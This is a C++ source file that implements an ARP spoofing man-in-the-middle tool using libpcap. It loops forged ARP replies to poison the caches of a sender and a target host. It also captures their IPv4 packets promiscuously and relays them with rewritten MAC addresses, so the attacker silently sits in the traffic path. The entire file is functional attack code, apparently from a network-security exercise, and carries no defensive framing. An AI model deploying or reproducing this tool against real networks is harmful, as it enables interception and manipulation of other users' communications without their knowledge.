#include "attack.h"

void *arp_infect(
    char *dev, Mac *attacker_mac, Ip *attacker_ip, Mac *sender_mac, Ip *sender_ip, Mac *target_mac, Ip *target_ip,
    volatile bool *running
) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return NULL;
    }
    
    EthArpPacket sender_packet = EthArpPacket(*sender_mac, *attacker_mac, ArpHdr::Reply, *attacker_mac, *target_ip, *sender_mac, *sender_ip);
    EthArpPacket target_packet = EthArpPacket(*target_mac, *attacker_mac, ArpHdr::Reply, *attacker_mac, *sender_ip, *target_mac, *target_ip);

    while (*running) {
        int res;
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sender_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            pcap_close(handle);
            return NULL;
        }
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&target_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            pcap_close(handle);
            return NULL;
        }
        sleep(1);
    }

    pcap_close(handle);
    return NULL;
}

void *send_modified_packet(pcap_t* handle, const u_char* packet, int caplen, Mac *src, Mac *dst) {
    EthHdr* eth = (EthHdr*)packet;
    eth->dmac_ = *dst;
    eth->smac_ = *src;
    int res = pcap_sendpacket(handle, packet, caplen);
    if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    return NULL;
}

void *relay_packet(
    char *dev, Mac *attacker_mac, Mac *sender_mac, Ip *sender_ip, Mac *target_mac,
    int sender_to_target_idx, int target_to_sender_idx,
    std::vector<PacketQueue> *packet_queue,
    volatile bool *running,
    std::mutex *m, std::condition_variable *cv
) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return NULL;
    }

    PacketQueue sender_to_target_queue = (*packet_queue)[sender_to_target_idx];
    PacketQueue target_to_sender_queue = (*packet_queue)[target_to_sender_idx];

    while (*running) {
        std::unique_lock<std::mutex> lock(*m);
        cv->wait(lock, [&] { return !sender_to_target_queue.empty() || !target_to_sender_queue.empty() || !*running; });
        if (!*running) {
            lock.unlock();
            break;
        }

        Packet packet;
        int caplen;
        if (!sender_to_target_queue.empty()) {
            std::tie(packet, caplen) = sender_to_target_queue.front();
            send_modified_packet(handle, packet, caplen, attacker_mac, target_mac);
        }

        if (!target_to_sender_queue.empty()) {
            std::tie(packet, caplen) = target_to_sender_queue.front();
            send_modified_packet(handle, packet, caplen, attacker_mac, sender_mac);
        }

        lock.unlock();
    }

    pcap_close(handle);
    return NULL;
}

void *receive_packet(
    char *dev,
    volatile bool *running,
    std::vector<PacketQueue> *packet_queue, IpMap *ip_map,
    std::mutex *m, std::condition_variable *cv
) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return NULL;
    }

    while (*running) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthHdr* eth = (EthHdr*)packet;
        if (eth->type() != EthHdr::Ip4) continue;

        IpHdr* ip = (IpHdr*)(packet + sizeof(EthHdr));
        IpPair ip_pair = std::make_pair(ip->sip(), ip->dip());
        if (ip_map->find(ip_pair) == ip_map->end()) continue;

        int idx = (*ip_map)[ip_pair];
        std::unique_lock<std::mutex> lock(*m);
        (*packet_queue)[idx].push({packet, header->caplen});
        lock.unlock();
        cv->notify_all();
    }

    pcap_close(handle);
    return NULL;
}